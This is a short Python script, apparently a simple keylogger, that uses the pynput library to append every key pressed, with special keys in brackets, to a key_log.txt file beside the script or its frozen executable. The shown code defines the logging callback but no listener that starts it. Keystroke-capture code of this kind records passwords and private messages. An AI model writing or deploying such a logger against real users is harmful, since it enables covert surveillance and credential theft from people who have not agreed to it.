import os
import sys
import pynput
from pynput import keyboard


def get_base_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

key_info = os.path.join(get_base_dir(), "key_log.txt")
open(key_info, "a").close()  # create file if missing

#Function to log key presses
def Keypress(key):
    print(str(key))
    with open(key_info, "a") as logKey:   #Open log file to append to
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. To make it look more neat, .replace will remove the Key. from the log file
